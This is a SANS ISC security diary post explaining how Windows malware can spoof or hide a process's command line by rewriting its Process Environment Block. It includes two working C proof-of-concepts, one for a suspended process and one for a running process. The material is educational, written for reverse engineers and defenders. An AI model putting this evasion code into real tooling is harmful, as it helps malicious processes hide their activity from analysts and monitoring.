---
ai_commentary: []
ai_commentary_meta:
  content_digest: ''
  generated_at: ''
  model: ''
  prompt_version: ''
  provider: ''
category: ai-security
date: '2026-01-09T08:15:14.019817+00:00'
exported_at: '2026-01-09T08:15:16.282738+00:00'
feed: https://isc.sans.edu/rssfeed.xml
language: en
source_url: https://isc.sans.edu/diary/rss/32614
structured_data:
  about: []
  author: ''
  description: 'Malicious Process Environment Block Manipulation, Author: Xavier Mertens'
  headline: Malicious Process Environment Block Manipulation, (Fri, Jan 9th)
  inLanguage: en
  keywords: []
  main_image: ''
  original_source: https://isc.sans.edu/diary/rss/32614
  publisher:
    logo: /favicon.ico
    name: gtcode.com
title: Malicious Process Environment Block Manipulation, (Fri, Jan 9th)
updated_at: '2026-01-09T08:15:14.019817+00:00'
url_hash: ee9fe6e7415a45a6f9abf020ddc76f5e7477e2db
---

Reverse engineers must have a good understanding of the environment where malware are executed (read: the operating system). In a previous diary, I talked about malicious code that could be executed when loading a DLL[
[1](https://isc.sans.edu/diary/Abusing+DLLs+EntryPoint+for+the+Fun/32562)
]. Today, I’ll show you how a malware can hide suspicious information related to created processes.

The API call CreateProcess() is dedicated to, guess what, the creation of new processes![
[2](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)
] I won’t discuss all the parameters here but you have to know to it’s possible to specify some flags that will describe how the process will be created. One of them is CREATE\_SUSPENDED (0x00000004). It will instruct the OS to create the process but not launch it automatically. This flag is usually a good sign of maliciousness (example in case of process hollowing)

Every process has a specific structure called the “PEB” (“Process Environment Block”)[
[3](https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb)
]. It’s a user-mode data structure in Windows that the operating system maintains for each running process to store essential runtime information such as loaded modules, process parameters, heap pointers, environment variables, and debugging flags.

The key element in the previous paragraph is
**user-mode**
. It means that a process is able to access its own PEB (example: to detect the presence of a debugger attached to the process) but also to modify it!

Let’s take a practical example where a malware needs to spawn a cmd.exe with some parameters. We can spoof the command line by modifying the PEB in a few steps:

1. Locate the PEB
2. Read the process parameters
3. Overwrite them
4. Resume the process

Here is a proof-of-concept:

```
#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#pragma comment(lib, "ntdll.lib")

int main() {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // Start a process with some parameters
    BOOL success = CreateProcessA(
        "C:\\Windows\\System32\\cmd.exe",
        (LPSTR)"cmd.exe /c echo I am malicious! }:->",
        NULL, NULL, FALSE,
        CREATE_SUSPENDED,
        NULL, NULL, &si, &pi
    );

    if (success) {
        PROCESS_BASIC_INFORMATION pbi;
        ULONG returnLength;

        // Get the PEB address
        NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &returnLength);

        // Read ProcessParameters
        PEB peb;
        ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &peb, sizeof(PEB), NULL);

        RTL_USER_PROCESS_PARAMETERS params;
        ReadProcessMemory(pi.hProcess, peb.ProcessParameters, &params, sizeof(RTL_USER_PROCESS_PARAMETERS), NULL);

        // Overwrite the CommandLine buffer
        WCHAR newCmd[] = L"cmd.exe /c echo Nothing to see here!";
        WriteProcessMemory(pi.hProcess, params.CommandLine.Buffer, newCmd, sizeof(newCmd), NULL);
        printf("Press enter to continue and resume the process...\n");
        getchar();

        // Resume the process
        ResumeThread(pi.hThread);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        printf("Process resumed with modified PEB.\n");
    }
    return 0;
}
```

Once you launch poc.exe, check the cmd.exe process:

![](https://isc.sans.edu/diaryimages/images/isc-20260109-1.png)

With this scenario, cmd.exe is executed with the
**new**
parameters. What about modifying a running process and hide (not spoof) its parameters?

To achieve this, the process does not have to be created in suspended state but it must be kept running! The idea is to get a handle on the process and modify its PEB:

```
void modifyRunningProcess(DWORD pid, const wchar_t* newCmd) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return;

    PROCESS_BASIC_INFORMATION pbi;
    ULONG retLen;
    NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);

    PEB peb;
    ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(PEB), NULL);

    RTL_USER_PROCESS_PARAMETERS params;
    ReadProcessMemory(hProcess, peb.ProcessParameters, &params, sizeof(params), NULL);

    USHORT newSize = (USHORT)(wcslen(newCmd) * sizeof(WCHAR));
    WriteProcessMemory(hProcess, params.CommandLine.Buffer, newCmd, newSize + 2, NULL);
    WriteProcessMemory(hProcess, (PBYTE)peb.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length),
???????                       &newSize, sizeof(USHORT), NULL);

    CloseHandle(hProcess);
    printf("PEB Updated for PID: %d\n", pid);
}
```

By aware that this technique has an important limitation, you must replace the existing command line with a less (with trailing spaces) or equal length, otherwise there is a risk of buffer overflow! Finally, this technique will not prevent tools like EDRs to log the orignial parameters because they are logged at process creation. Hopefully!

[1]
<https://isc.sans.edu/diary/Abusing+DLLs+EntryPoint+for+the+Fun/32562>

[2]
<https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa>

[3]
<https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb>

Xavier Mertens (@xme)

Xameco

Senior ISC Handler - Freelance Cyber Security Consultant

[PGP Key](https://keybase.io/xme/key.asc)